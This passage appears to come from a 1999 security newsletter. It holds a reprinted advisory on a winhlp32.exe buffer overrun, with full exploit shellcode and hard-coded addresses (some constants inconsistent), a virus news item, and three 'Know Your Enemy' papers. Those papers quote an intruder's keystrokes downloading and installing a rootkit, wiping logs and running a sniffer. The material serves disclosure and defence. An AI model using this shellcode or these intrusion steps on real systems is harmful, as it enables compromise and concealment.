      boot sector on floppy diskettes. 
      
 08.0 WINHLP32.EXE BUFFER OVERRUN
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      From http://www.net-security.org/
            
      by BHZ, Tuesday 25th May 1999 on 1.01 am CET
      David Litchfield aka Mnemonix wrote an advisory on winhlp32.exe buffer overrun. "The
      buffer overrun in winhlp32.exe occurs when it attempts to read a cnt file with an overly
      long heading string. If the string is longer than 507 bytes the buffer overrun does not
      occur - winhlp32 just truncates the entry." Read the advisory below.
         
      Analysis of the winhlp32.exe buffer overrun.

      The buffer overrun in winhlp32.exe occurs when it attempts to read a cnt
      file with an overly long heading string. If the string is longer than 507
      bytes the buffer overrun does not occur - winhlp32 just truncates the entry.
      The return address is overwritten with bytes 357, 358, 359 and 360.
      Everything before these bytes is lost giving us bytes 361 to 507 to play
      with - a total of 147 bytes for our exploit code. On playing around with the
      overrun we find we lose about another 20 of these bytes giving us only 127
      bytes to play with - not a lot really.
      
      On overruning the buffer and analysing the contents of memory and the CPU's
      registers with a debugger we find that byte 361 is found at 0x0012F0E4. This
      is the address we need to get the processor to go to to get its next
      instruction - but this address has a NULL in it which totally messes things
      up. However, looking at the registers we can see that the ESP, the Stack
      Pointer, holds this address so if we can find somewhere in memory that does
      a JMP ESP, and set the return address to this then we should be able to get
      back to the address where we'll place our exploit code. Looking at the DLLs
      that winhlp32.exe uses we find that kernel32.dll has the JMP ESP instruction
      at 0x77F327E5 (Service Pack 4's version of kernel32.lib - I think it's at
      0x77F327D5 on Service Pack 3's kernel32.dll).
      
      So we put 0x77F327E5 into bytes 357 to 360 but we have to load it in
      backwards so byte 357 we'll set to 0xE5, byte 358 to 0x27, byte 359 to 0xF3
      and byte 360 to 0x77.
      
      Now we've jumped back to our exploit code we have to decide what we wan to
      put in it. Because we only have 127 bytes to do anything meaningful we need
      to start another program - the best thing is to get it to run a batch file.
      This means calling the system ( ) function which is exported by msvcrt.dll
      which isn't loaded into the address space of winhlp32.exe - so we'll have to
      load it. How do we do this? We have to call LoadLibrary ( ) which is
      exported by kernel32.dll which is in the address space. LoadLibraryA ( ) is
      exported at address 0x77F1381A so all we need to do is have the string
      "msvcrt.dll" in memory somewhere and call 0x77F1381A with a reference to the
      pointer to the null terminated "msvcrt.dll" string. Because it has to be
      null terminated we'll get our code to write it into memory. Once this is
      done we'll place the address of LoadLibraryA ( ) onto the stack then place
      the address of the pointer to "msvcrt.dll" and finally call LoadLibraryA ( )
      using an offset from the EBP. The following is the Assembly Code needed to
      do this:
      
         /*First the procedure prologue */
         push ebp
         mov ebp,esp
      
         /*Now we need some zeroes */
         xor eax,eax
      
         /* and then  push then onto the stack */
         push eax
         push eax
         push eax
      
         /* Now we write MSVCRT.DLL into the stack */
         mov byte ptr[ebp-0Ch],4Dh
         mov byte ptr[ebp-0Bh],53h
         mov byte ptr[ebp-0Ah],56h
         mov byte ptr[ebp-09h],43h
         mov byte ptr[ebp-08h],52h
         mov byte ptr[ebp-07h],54h
         mov byte ptr[ebp-06h],2Eh
         mov byte ptr[ebp-05h],44h
         mov byte ptr[ebp-04h],4Ch
         mov byte ptr[ebp-03h],4Ch
      
         /* move the address of LoadLibraryA ( ) into the edx register */
         mov edx,0x77F1381A
      
         /* and then push it onto the stack */
         push edx
      
         /* Then we load the address where the msvcrt.dll string can be found */
         lea eax,[ebp-0Ch]
      
         /* and push it onto the stack */
         push eax
      
         /* Finally we call LoadLibraryA( )
         call dword ptr[ebp-10h]
      
      All things going well we should have now loaded msvcrt.dll into the address
      space of winhlp32.exe. With this in place we now need to call system() and
      provide the name of a batch file to it as an argument. We don't have enough
      bytes to play with to call GetProcessAddress ( ) and do the rest of the
      things we have to do like clean up so we check what version of msvcrt.dll we
      have before writing the code and see where system ( ) is exported at. On a
      standard install of Windows NT this will normally be version 4.20.6201 with
      system () exported at 0x7801E1E1. We'll call the batch file ADD.bat but to
      save room we won't give it an extention. The system ( ) function will try
      the default executable extentions like.exe, .com and .bat and find it for us
      then run it. Once it has run it the cmd.exe process system( ) has launched
      will exit.
      
      So we need to have the null terminated string "ADD" in memory and  the
      address of system ( ). Below is the code that will write "ADD" onto the
      stack and then call system( )
      
         /*First the procedure prologue */
         push ebp
         mov ebp,esp
      
         /* We need some NULL and then push them onto the stack */
         xor edi,edi
         push edi
      
         /* Now we write ADD onto the stack */
         mov byte ptr [ebp-04h],41h
         mov byte ptr [ebp-03h],44h
         mov byte ptr [ebp-02h],44h
      
         /* Place address of system ( ) into eax and push it onto the stack */
         mov eax, 0x7801E1E1
         push eax
      
         /* Now load eax with address of ADD and push this too */
         lea eax,[ebp-04h]
         push eax
      
         / * Then we call system ( ) */
         call dword ptr [ebp-08h]
      
      Once the batch file has been run the Command Interpreter will exit and if we
      don't clean up after ourselves winhlp32.exe will access violate so we need
      to call exit (0) to keep it quiet. exit ( ) is also exported by msvcrt.dll
      at address 0x78005BBA - which has a null in it. It's not a major problem -
      we can fill a register with 0xFFFFFFFF and subtract 0x87FFA445 from it. The
      following code calls exit (0)
      
      
         /* Procedure prologue */
         push ebp
         mov ebp,esp
      
         /* Round about way of getting address of exit () into edx */
         mov edx,0xFFFFFFFF
         sub edx,0x87FFAF65
      
         /* Push this address onto the stack */
         push edx
      
         /* Get some nulls - this is our exit code - and push them too */
         xor eax,eax
         push eax
      
         /* then call exit()! */
         call dword ptr[ebp-04h]
      
      Altogether our code looks like this:
      
         push ebp
         mov ebp,esp
         xor eax,eax
         push eax
         push eax
         push eax
         mov byte ptr[ebp-0Ch],4Dh
         mov byte ptr[ebp-0Bh],53h
         mov byte ptr[ebp-0Ah],56h
         mov byte ptr[ebp-09h],43h
         mov byte ptr[ebp-08h],52h
         mov byte ptr[ebp-07h],54h
         mov byte ptr[ebp-06h],2Eh
         mov byte ptr[ebp-05h],44h
         mov byte ptr[ebp-04h],4Ch
         mov byte ptr[ebp-03h],4Ch
         mov edx,0x77F1381A
         push edx
         lea eax,[ebp-0Ch]
         push eax
         call dword ptr[ebp-10h]
         push ebp
         mov ebp,esp
         xor edi,edi
         push edi
         mov byte ptr [ebp-04h],43h
         mov byte ptr [ebp-03h],4Dh
         mov byte ptr [ebp-02h],44h
         mov eax, 0x7801E1E1
         push eax
         lea eax,[ebp-04h]
         push eax
         call dword ptr [ebp-08h]
         push ebp
         mov ebp,esp
         mov edx,0xFFFFFFFF
         sub edx,0x87FFA445
         push edx
         xor eax,eax
         push eax
         call dword ptr[ebp-04h]
      
      Now we need the operayion codes (opcodes) for all this which we do by
      writing a program that uses the __asm function and then debug it. This is
      what we actually load into our exploit code.
      
      Following is the source of a program that will create a "trojaned"
      wordpad.cnt. It will also create a batch file called add.bat - edit it as
      you see fit. I have compiled the program - you can get a copy of it from
      
      http://www.infowar.co.uk/mnemonix/winhlpadd.exe
      
      Note that this will run only on standard installs of NT with service pack 4
      and expects an msvcrt.dll version of 4.20.6201 - run it from the winnt\help
      directory.

      Couple of days ago we wrote about Galadriel virus. This virus infects files with the
      CSC extension when an infected script is run from under CorelDraw and Corel Photo
      Paint 7, 8 and 9. A user is likely to notice the presence of the virus because many
      scripts stop executing properly when infected and a CorelDraw error message will
      occur. The CSC/CSV.A virus does not work under the WordPerfect suite as this suite
      uses a different language than the Corel script. NAI categorized this virus as Low risk,
      and you could update your VirusScan with these patches: VirusScan 3 & VirusScan 4.0

      The Attack of the Script Kiddie 
      Know Your Enemy 
      
      Lance Spitzner 
      Last Modified: May 23, 1999 
      
      My commander used to tell me that to secure yourself against the enemy, you have to first know who your enemy
      is. This military doctrine readily applies to the world of network security. Just like the military, you have resources
      that you are trying to protect. To help protect these resources, you need to know who your threat is and how they
      are going to attack. This article does just that, it discusses the methodology and tools used by one of the most
      common and universal threats, the Script Kiddie. 
      
      Who is the Script Kiddie 
      
      The script kiddie is someone looking for the easy kill. They are not out for specific information or targeting a specific company.
      Their goal is to gain root the easiest way possible. They do this by focusing on a small number of exploits, and then searching
      the entire Internet for that exploit. Sooner or later they find someone vulnerable. 
      
      Some of them are advance users who develop their own tools and leave behind sophisticated backdoors. Others have no idea
      what they are doing and only know how to type "go" at the command prompt. Regardless of the their skill level, they all share a
      common strategy, randomly search for a specific weakness, then exploit that weakness. 
      
      The Threat 
      
      It is this random selection of targets that make the script kiddie such a dangerous threat. Sooner or later your systems and
      networks will be probed, you cannot hide from them. I know of admins who were amazed to have their systems scanned when
      they had been up for only two days, and no one knew about them. There is nothing amazing here. Most likely, their systems
      were scanned by a script kiddie who happened to be sweeping that network block. 
      
      If this was limited to several individual scans, statistics would be in your favor. With millions of systems on the Internet, odds
      are that no one would find you. However, this is not the case. Most of these tools are easy to use and widely distributed,
      anyone can use them. A rapidly growing number of people are obtaining these tools at an alarming rate. As the Internet knows
      no geographic bounds, this threat has quickly spread throughout the world. Suddenly, the law of numbers is turning against us.
      With so many users on the Internet using these tools, it is no longer a question of if, but when you will be probed. 
      
      This is an excellent example of why security through obscurity can fail you. You may believe that if no one knows about your
      systems, you are secure. Others believe that their systems are of no value, so why would anyone probe them? It is these very
      systems that the script kiddies are searching for, the unprotected system that is easy to exploit, the easy kill. 
      
      The Methodology 
      
      The script kiddie methodology is a simple one. Scan the Internet for a specific weakness, when you find it, exploit it. Most of
      the tools they use are automated, requiring little interaction. You launch the tool, then come back several days later to get your
      results.  No two tools are alike, just as no two exploits are alike. However, most of the tools use the same strategy. First,
      develop a database of IPs that can be scanned. Then, scan those IPs for a specific vulnerability. 
      
      For example, lets say a user had a tool that could exploit imap on Linux systems, such as imapd_exploit.c. First, they would
      develop a database of IP addresses that they could scan (i.e., systems that are up and reachable). Once this database of IP
      addresses is built, the user would want to determine which systems were running Linux. Many scanners today can easily
      determine this by sending bad packets to a system and seeing how they respond, such as Fyodor's nmap. Then, tools would be
      used to determine what Linux systems were running imap. All that is left now is to exploit those vulnerable systems. 
      
      You would think that all this scanning would be extremely noisy, attracting a great deal of attention. However, many people are
      not monitoring there systems, and do not realize they are being scanned. Also, many script kiddies quietly look for a single
      system they can exploit. Once they have exploited a system, they now use this systems as a launching pad. They can boldly
      scan the entire Internet without fear of retribution. If their scans are detected, the system admin and not the blackhat will be held
      liable. 
      
      Also, these scan results are often archived or shared among other users, then used at a later date.  For example, a user
      develops a database of what ports are open on reachable Linux systems.  The user built this database to exploit the current
      imap vulnerability.  However, lets say that a month from now a new Linux exploit is identified on a different port.  Instead of
      having to build a new database (which is the most time consuming part), the user can quickly review his archived database and
      compromise the vulnerable systems.  As an alternative, script kiddies share or even buy databases of vulnerable systems from
      each other.  The script kiddie can then exploit your system without even scanning it.  Just because your systems have not been
      scanned recently does not mean you are secure. 
      
      The more sophisticated blackhats implement trojans and backdoors once they compromise a system. Backdoors allow easy
      and unnoticed access to the system whenever the user wants. The trojans make the intruder undetectable. He would not show
      up in any of the logs, systems processes, or file structure. He builds a comfortable and safe home where he can blatantly scan
      the Internet.  For more information on this, check out Know Your Enemy: III. 
      
      These attacks are not limited to a certain time of the day. Many admins search their log entries for probes that happen late at
      night, believing this is when blackhats attack. Script kiddies attack at any time. As they are scanning 24hrs a day, you have no
      idea when the probe will happen. Also, these attacks are launched throughout the world. Just as the Internet knows no
      geographical bounds, it knows no time zones. It may be midnight where the blackhat is, but it is 1pm for you. 
      
      The Tools 
      
      The tools used are extremely simple in use. Most are limited to a single purpose with few options. First come the tools used to
      build an IP database. These tools are truly random, as they indiscriminently scan the Internet. For example, one tool has a single
      option, A, B, or C. The letter you select determines the size of the network to be scanned. The tool then randomly selects
      which IP network to scan. Another tool uses a domain name (z0ne is an excellent example of this). The tools builds an IP
      database by conducting zone transfers of the domain name and all sub-domains. User's have built databases with over 2 million
      IPs by scanning the entire .com or .edu domain. 
      
      Once discovered, the IPs are then scanned by tools to determine vulnerabilities, such as the version of named, operating
      system, or services running on the system Once the vulnerable systems have been identified, the blackhat strikes. Several tools
      exist that combine all these features together, simplifying the process even greater, such as sscan by jsbach.  For a better
      understanding of how these tools are used, check out Know Your Enemy: II. 
      
      How to Protect Against This Threat 
      
      There are steps you can take to protect yourself against this threat. First, the script kiddie is going for the easy kill, they are
      looking for common exploits. Make sure your systems and networks are not vulnerable to these exploits. Both
      http://www.cert.org and http://www.ciac.org are excellent sources on what a common exploit is. Also, the listserv bugtraq is
      one of the best sources of information. 
      
      Another way to protect yourself is run only the services you need. If you do not need a service, turn it off. If you do need a
      service, make sure it is the latest version.  For examples on how to do this, check out  Armoring Solaris ,  Armoring Linux  or 
      Armoring NT. 
      
      As you learned from the tools section, DNS servers are often used to develop a database of systems that can be probed. Limit
      the systems that can conduct zone transfers from your Name Servers. Log any unauthorized zone transfers and follow up on
      them. I highly recommend upgrading to the latest version of BIND (software used for Domain Name Service), which you can
      find at http://www.isc.org/bind.html. 
      
      Last, watch for your systems being probed. Once identified, you can track these probes and gain a better understanding of the
      threats to your network and react to these threats. 
      
      Conclusion 
      
      The script kiddie poses a threat to all systems. They show no bias and scan all systems, regardless of location and value.
      Sooner or later, your system will be probed. By understanding their motives and methods, you can better protect your systems
      against this threat.

      In the first article, Know Your Enemy, we covered the tools and methodologies of the Script Kiddie.   Specifically,
      how they probe for vulnerabilities and then attack.  Now we will cover how to track their movements.   Just as in
      the military, you want to track the bad guys and know what they are doing.  We will cover what you can, and cannot
      determine, with your system logs.  You may be able to determine if you are being probed,  what you were being
      probed for,  what tools were used, and if they successful.  The examples provided here focus on Linux, but can
      apply to almost any flavor of Unix.  Keep in mind, there is no guaranteed way to track the enemy's every step. 
      However, this article is a good place to start. 
      
      Securing Your Logs 
      This article is not on Intrusion Detection, there are a variety of excellent sources that cover IDS.  If you are interested in
      intrusion detection, I recommend checking out applicatons such as Network Flight Recorder  or swatch.  This article focuses
      on intelligence gathering.  Specifically, how to figure out what the enemy is doing by reviewing your system logs.  You will be
      surprised how much information you will find in your own log files.  However, before we can talk about reviewing your logs, we
      first have to discuss securing your system logs.  Your log files are worthless if you cannot trust the integrity of them.  The first
      thing most blackhats do is alter log files on a compromised system.  There are a variety of rootkits that will wipe out their
      presence from log files (such as cloak), or alter logging all together (such as trojaned syslogd binaries).  So, the first step to
      reviewing your logs is securing your logs. 
      
      This means you will need to use a remote log server.  Regardless of how secure your system is, you cannot trust your logs on a
      compromised system.  If nothing else, the blackhat can simply do a rm -rf /* on your system, wiping you hard drive clean. 
      This makes recovering your logs somewhat difficult.  To protect against this, you will want all your systems to log traffic both
      locally and to a remote log server.  I recommend making your log server a dedicated system, ie. the only thing it should be
      doing is collecting logs from other systems..  If money is an issue, you can easily build a linux box to act as your log server. 
      This server should be highly secured, with all services shut off, allowing only console access (see Armoring Linux for an
      example).   Also, ensure that port 514 UDP is blocked or firewalled at your Internet connection.  This protects your log server
      from receiving bad or un-authorized logging information from the Internet. 
      
      For those of you who like to get sneaky, something I like to do is recompile syslogd to read a different configuration file, such
      as /var/tmp/.conf.  This way the blackhat does not realize where the real configuration file is. This is simply done by changing
      the entry "/etc/syslog.conf" in the source code to whatever file you want.  We then setup our new configuration file to log both
      locally and to the remote log server (see example).  Make sure you maintain a standard copy of the configuration file,
      /etc/syslog.conf, which points to all local logging.  Even though this configuration file is now useless, this will throw off the
      blackhat from realizing the true destination of our remote logging.  Another option for your systems is to use a secure method of
      logging.  One option is to replace your syslogd binary with something that has integrity checking and a greater breadth of
      options.  One option is syslog-ng, which you can find at  http://www.balabit.hu/products/syslog-ng.html 
        
      
      Most of the logs we will use are the ones stored on the remote log server.  As mentioned earlier, we can be fairly confident of
      the integrity of these logs since they are on a remote and secured system.  Also, since all systems are logging to a single source,
      it is much easier to identify patterns in these logs.  We can quickly review what's happening to all the systems in one source. 
      The only time you would want to review logs stored locally on a system is to compare them to what the log server has.   You
      can determine if the local logs have been altered by comparing them to the remote logs. 
      
      Pattern Matching 
      By looking at your log entries, you can usually determine if you are being port scanned.  Most Script Kiddies scan a network
      for a single vulnerability.  If your logs show most of your systems being connected from the same remote system, on the same
      port, this is most likely an exploit scan.  Basically, the enemy has an exploit for a single vulnerability, and they are scanning your
      network for it.  When they find it, they exploit it.  For most Linux systems, TCP Wrappers is installed be default.  So, we
      would find most of these connections in /var/log/secure.  For other flavors of Unix, we can log all inetd connections by
      launching inetd with the "-t" flag., facility daemon. A typical exploit scan would look like something below.  Here we have a
      source scanning for the wu-ftpd vulnerability. 
      
      /var/log/secure 
      Apr 10 13:43:48 mozart in.ftpd[6613]: connect from 192.168.11.200 
      Apr 10 13:43:51 bach in.ftpd[6613]: connect from 192.168.11.200 
      Apr 10 13:43:54 hadyen in.ftpd[6613]: connect from 192.168.11.200 
      Apr 10 13:43:57 vivaldi in.ftpd[6613]: connect from 192.168.11.200 
      Apr 10 13:43:58 brahms in.ftpd[6613]: connect from 192.168.11.200 
      
      Here we see the source 192.168.11.200 scanning our network.  Notice how the source sequentially scans each IP (this is
      not always the case).  This is the advantage of having a log server, you can more easily identify patterns in your network since
      all the logs are combined.  The repeated connections to port 21, ftp, indicated they were most likely looking for the wu-ftpd
      exploit.  We have just determined what the blackhat is looking for.  Often, scans tend to come in phases.  Someone will release
      code for an imap exploit, you will suddenly see a rush of imaps scans in your logs.  The next month  you will be hit by ftp.  An
      excellent source for current exploits is http://www.cert.org/advisories/  Sometimes,  tools will scan for a variety of exploits at
      the same time, so you may see a single source connecting to several ports. 
      
      Keep in mind, if you are not logging the service, you will not know if you are scanned for it.  For example, most rpc
      connections are not logged.  However, many services can simply be added to /etc/inetd.conf for logging with TCP Wrappers. 
      For example, you can add an entry in /etc/inetd.conf for NetBus. You can define TCP Wrappers to safely deny and log the
      connections (see Intrusion Detection for more info on this). 
      
      What's the Tool? 
      Sometimes you can actually determine the tools being used to scan your network.  Some of the more basic tools scan for a
      specific exploit, such as ftp-scan.c. If only a single port or vulnerability is being probed on your network, they are most likely
      using one of these "single mission" tools.  However, there exist  tools that probe for a variety of vulnerabilities or weaknesses,
      the two most popular are sscan by jsbach and nmap by Fyodor.  I've selected these two tools because they represent the two
      "categories" of scanning tools.  I highly recommend you run these tools against your own network, you may be surprised by  the
      results :) 
      
           sscan represents the "all purpose" Script Kiddie scanning tool, and its probably one of the best ones out there.  It quickly
           probes a network for a variety of vulnerabilities (including cgi-bin).  It is easily customizable, allowing you to add probes
           for new exploits.  You just give the tool a network and network mask, and it does the rest for you.  However, the user
           must be root to use it.  The output is extremely easy to interpret (hence making it so popular):  It gives a concise
           summary of many vulnerable services.  All you have to do is run sscan against a network, grep for the word "VULN" in
           the output, and then run the "exploit du jour".  Below is an example of sscan ran against the system mozart
           (172.17.6.30). 
      
                otto #./sscan -o 172.17.6.30

           Nmap represents the "raw data" tool set.  It doesn't tell you what vulnerabilities exist,  rather, it tells you what ports are
           open, you determine the security impact.  Nmap has quickly become the port scanner of choice, and with good reason. 
           It takes the best of a variety of port scanners and puts all their functionality into a single tool, including OS detection,
           various packet assembly options, both UDP and TCP scanning, randomization, etc.  However, you need  networking
           skills to use the tool and interpret the data.  Below is an example of nmap ran against the same system.

      By reviewing your logs, you can determine which of these tools were used against you.  To do this, you have to understand
      how the tools work.  First, an sscan will log in  as follows (this is a default scan with no modifications to any config files):

      sscan also scans for cgi-bin vulnerabilities.  These probes will not be logged by syslogd, you will find them in access_log.  I

      Notice how a complete connection was made for all the ports(SYN, SYN-ACK, ACK)  then torn down.  That is because
      sscan is determining at the application layer what is going on.  Not only does sscan want to know if your ftp port is open, but
      what ftp daemon is running.  The same can be said for imap, pop, etc.  This can be seen in sniff traces using sniffit, a tool
      commonly used to sniff passwords.

      As you see above, a complete connection was made to determine the version of wu-ftpd that was running.  When you see the
      complete connections in your logs, as shown above, you are most likely  being scanned by an exploit tool.  These tools are
      making a complete connection to determine what you are running. 
      
      Nmap, like most port scanners, does not care what you are running, but if you are running specific services.  For this, nmap
      has a powerful set of options, letting you determine what kind of connection to make, including SYN, FIN, Xmas, Null, etc. 
      For a detailed description of these options, check out http://www.insecure.org/nmap/nmap_doc.html.   Because of these
      options, your logs will be different based on the options selected by the remote user.   A connection made with the -sT flag is a
      complete connection, so the logs will like similar to sscan, however by default nmap scans more ports.

      One thing to keep in mind is the -D (or decoy) option.  This nmap option allows the user to spoof the source address.  You
      may see scans from 15 different sources at the same time, but only one of them is the real one.  It is extremely difficult to
      determine which of the 15 was the actual source.  More often, users will select the -sS flag for port scanning.  This is a
      stealthier option, as only a SYN packet is sent.   If the remote system responds, the connection is immediately torn down with a
      RST.  The logs from such a scan looks as follows (NOTE: Only the first five entries are included here)..

      Notice all the errors in the connections.  Since the SYN-ACK sequence is torn down before a complete connection can be
      made, the daemon cannot determine the source system.  The logs show that you have been scanned, unfortunately you do not
      know by whom.  What is even more alarming is, on most other systems (including newer kernels of Linux), none of these errors
      would have been logged.  To qoute Fyodor " ... based on all the 'connection reset by peer' messages.  This is a Linux 2.0.XX
      oddity -- virtually every other system (including the 2.2 and later 2.1 kernels) will show nothing.  That bug (accept() returning
      before completion of the 3-way handshake) was fixed. 
      
      Nmap includes other stealth option, such as -sF, -sX, -sN where various flags are used,  This is what the logs look like for
      these scans 
      
      /var/log/secure 
        
      
      Notice something here, no logs!  Scary huh, you just got scanned and didn't even know it.  All three types of scans determined
      the same results, however you are able to fully log only the first type, -sT (full connection).  To detect these stealsth scans, you
      will need to use a different logging application such as tcplogd, scanlogd, or ippl   Some commercial Firewalls will also detect
      and log all of these scans (I have confirmed this on Checkpoint Firewall 1). 
        
      
      Did They Gain Access? 
      Once you have determined that you were scanned, and what you were looking for, the next big question is "Did they get in?".  
      Most of today's remote exploits are based on buffer overflows (otherwise known as smashing the stack).  Simply stated, a
      buffer overflow is when a program (usually a daemon) receives more input then it expected, thus overwriting critical  areas in
      memory.  Certain code is then executed, usually giving the user root access.  For more info on buffer overflows, check
      Aleph1's excellent paper at ftp://ftp.technotronic.com/rfc/phrack49-14.txt. 
      
      You can normally identify buffer overflow attacks in the /var/log/messages log file (or /var/adm/messages for other flavors of
      Unix) for attacks such as mountd.  You will also see similar logs in maillog for such attacks against imapd.  A buffer overflow
      attack would look like this.

      When you see something like this in your log files, someone has attempted to exploit your system.  It is difficult to determine if
      the exploit was successful.  One way to do this is, following the exploit attempt, see if there are any connections from the
      remote source to your system.  If they successfully login from the remote system, they have access.  Another clue is if you find
      the accounts "moof", "rewt", "crak0", or "w0rm" added to your /etc/passwd file.  These accounts, uid 0, are added by some of
      the more common exploit scripts.  Once a blackhat gains access, normally the first thing they do is wipe your logs clean and
      trojan your logging (syslogd), for more information, see Know Your Enemy: III.  From this point on, you will not receive any
      logs from your system as everything has been compromised.  What you do next is subject for another article :).   Until then, I
      recommend you check out http://www.cert.org/nav/recovering.html

      Conclusion 
      Your system logs can tell you a great deal about the enemy.  However, the first step is guaranteeing the integrity of your log
      files.  One of the best ways to do that is use a remote log server that receives and stores logs from all systems.  Once secured,
      you can then identify patterns in your log files.  Based on these patterns and log entries, you can determine what the blackhat is
      looking for, and potentially what tools they are using.  Based on this knowledge, you can better secure and protect your
      systems.

      They Gain Root 
      Know Your Enemy: III

      Last Modified: 23 May, 1999 
      
      This article is the third of a series focusing on the script kiddie.  The first paper focuses on how script kiddies probe
      for,  identify, and exploit vulnerabilities.  The second paper focuses on how you can detect these attempts, identify
      what tools they are using and what vulnerabilities they are looking for.  This paper, the third, focuses on what
      happens once they gain root.  Specifically, how they cover their tracks and what the do next. 
      
      Who is the script kiddie 
      
      As we learned in the first paper, the script kiddie is not so much a person as it is a strategy, the strategy of probing for the easy
      kill. One is not searching for specific information or targeting a specific company, the goal is to gain root the easiest way
      possible. Intruders do this by focusing on a small number of exploits, and then searching the entire Internet for that exploit. Do
      not understimate this strategy, sooner or later they find someone vulnerable. 
      
      Once they find a vulnerable system and gain root, their first step is normally to cover their tracks.  They want to ensure you do
      not know your system was hacked and cannot see nor log their actions.  Following this, they often use your system to scan
      other networks, or silently monitor your own. To gain a better understanding of how they accomplish these acts, we are going
      to follow the steps of a system compromised by an intruder using script kiddie tactics.  Our system, called mozart, is a Linux
      box running Red Hat 5.1.  The system was compromised on April 27, 1999.  Below are the actual steps our intruder took,
      with system logs and keystrokes to verify each step.  All system logs were recorded to a protected syslog server, all
      keystrokes were captured using sniffit.  Throughout this paper our intruder is refered to as he, however we have no idea what
      the true gender of the intruder is. 
      
      The exploit 
      
      On 27 April, at 00:13 hours, our network was scanned by the system 1Cust174.tnt2.long-branch.nj.da.uu.net for several
      vulnerabilities, including imap.  Our intruder came in noisy, as every system in the network was probed (for more information on
      detecting and analyzing scans, please see the second paper of this series). 
      
      Apr 27 00:12:25 mozart imapd[939]: connect from 208.252.226.174 
      Apr 27 00:12:27 bach imapd[1190]: connect from 208.252.226.174 
      Apr 27 00:12:30 vivaldi imapd[1225]: connect from 208.252.226.174 
      
      Apparently he found something he liked and returned at 06:52 and 16:47 the same day.  He started off with a more thorough
      scan, but this time focusing only on mozart.  He identified a weakness and launched a successful attack against mountd, a
      commonly known vulnerability for Red Hat 5.1.  Here we see in  /var/log/messages the intruder gaining root.  The tool used
      was most likely ADMmountd.c, or something similar to it.

      Immediately following this exploit, we see in /var/log/messages our intruder gaining root by telneting in as the user crak0, and
      then su to the user rewt.  Both of these accounts were added by the exploit script.  Our intruder now has total control of our
      system.

      Covering their tracks 
      
      The intruder is now on our system as root.  As we are now about to see, the next step for him is to make sure he does not get
      caught.  First, he checks to see if anyone else is on the system. 
      
      [crak0@mozart /tmp]$ w 
        4:48pm  up 1 day, 18:27,  1 user,  load average: 0.00, 0.00, 0.00

      After making sure the coast is clear, he will want to hide all of his actions. This normally entails removing any evidence from the
      logs files and replacing system binaries with trojans, such as ps or netstat, so you cannot see the intruder on your own system. 
      Once the trojans are in place, the intruder has gained total control of your system and you will most likely never know it. Just as
      there are automated scripts for hacking, there are also automated tools for hiding intruders, often called rootkits.  One of the
      more common rootkits is lrk4.  By executing the script, a variety of critical files are replaced, hiding the intruder in seconds. 
      For more detailed information on rootkits, see the README that comes with lrk4.  This will give you a better idea how
      rootkits work in general. 
      
      Within minutes of compromising our system, we see the intruder downloading the rootkit  and then implementing the script with
      the command "make install".   Below are the actual keystrokes the intruder typed to hide himself. 
      
      cd /dev/ 
      su rewt 
      mkdir ". " 
      cd ". " 
      ftp technotronic.com 
      anonymous 
      fdfsfdsdfssd@aol.com 
      cd /unix/trojans 
      get lrk4.unshad.tar.gz 
      quit 
      ls 
      tar -zxvf lrk4.unshad.tar.gz 
      mv lrk4 proc 
      mv proc ". " 
      cd ". " 
      ls 
      make install 
      
      Notice the first thing that our intruder did, he created the hidden directory ".  " to hide his toolkit.  This directory does not show
      up with the "ls" command, and looks like the local directory with "ls -la" command. One way you can locate the directory is
      with the "find" command (be sure you can trust the integrity of your "find" binary). 
      
      mozart #find / -depth -name "*.*" 
      /var/lib/news/.news.daily 
      /var/spool/at/.SEQ 
      /dev/. /. /procps-1.01/proc/.depend 
      /dev/. /. 
      /dev/. 
      
      Our intruder may have been somewhat sophisticated in using trojan binaries, but had a simpler approach to cleaning the logs
      files.  Instead of using cleaning tools such as zap2 or clean, he copied /dev/null to the files /var/run/utmp and /var/log/utmp,
      while deleting /var/log/wtmp.  You know something is wrong when these logs files contain no data, or you get the following
      error: 
      
      [root@mozart sbin]# last -10 
      last: /var/log/wtmp: No such file or directory 
      Perhaps this file was removed by the operator to prevent logging last info. 
      
      The next step 
      
      Once a system has been compromised, intruders tend to do one of two things.  First, they use your system as a launching pad
      and scan or exploit other systems.  Second, they decided to lay low and see what  they can learn about your system, such as
      accounts for other systems.  Our intruder decided for option number two, lay low and see what he could learn.  He
      implemented a sniffer on our system that would capture all of our network traffic, including telnet and ftp sessions to other
      systems.  This way he could learn logins and passwords.  We see the sytem going into promiscuous mode in /var/log/messages
      soon after the compromise. 
      
      Apr 27 17:03:38 mozart kernel: eth0: Setting promiscuous mode. 
      Apr 27 17:03:43 mozart kernel: eth0: Setting promiscuous mode. 
      
      After implementing the trojan binaries, clearning the log files, and starting the sniffer, our intruder disconnected from the system. 
      However, we will see him returning the next day to find what traffic he captured. 
      
      Damage Control 
      
      Since our friend had disconnected, this gave me a chance to review the system and see what exactly happened.  I was
      extremely interested to see what was altered, and where he was logging the sniffer information.  First, I quickly identified with
      Tripwire which files were modified.  Tripwire showed the following: 
      
      added:   -rw-r--r-- root            5 Apr 27 17:01:16 1999 /usr/sbin/sniff.pid 
      added:   -rw-r--r-- root          272 Apr 27 17:18:09 1999 /usr/sbin/tcp.log 
      changed: -rws--x--x root        15588 Jun  1 05:49:22 1998 /bin/login 
      changed: drwxr-xr-x root        20480 Apr 10 14:44:37 1999 /usr/bin 
      changed: -rwxr-xr-x root        52984 Jun 10 04:49:22 1998 /usr/bin/find 
      changed: -r-sr-sr-x root       126600 Apr 27 11:29:18 1998 /usr/bin/passwd 
      changed: -r-xr-xr-x root        47604 Jun  3 16:31:57 1998 /usr/bin/top 
      changed: -r-xr-xr-x root         9712 May  1 01:04:46 1998 /usr/bin/killall 
      changed: -rws--s--x root       116352 Jun  1 20:25:47 1998 /usr/bin/chfn 
      changed: -rws--s--x root       115828 Jun  1 20:25:47 1998 /usr/bin/chsh 
      changed: drwxr-xr-x root         4096 Apr 27 17:01:16 1999 /usr/sbin 
      changed: -rwxr-xr-x root       137820 Jun  5 09:35:06 1998 /usr/sbin/inetd 
      changed: -rwxr-xr-x root         7229 Nov 26 00:02:19 1998 /usr/sbin/rpc.nfsd 
      changed: -rwxr-xr-x root       170460 Apr 24 00:02:19 1998 /usr/sbin/in.rshd 
      changed: -rwxr-x--- root       235516 Apr  4 22:11:56 1999 /usr/sbin/syslogd 
      changed: -rwxr-xr-x root        14140 Jun 30 14:56:36 1998 /usr/sbin/tcpd 
      changed: drwxr-xr-x root         2048 Apr  4 16:52:55 1999 /sbin 
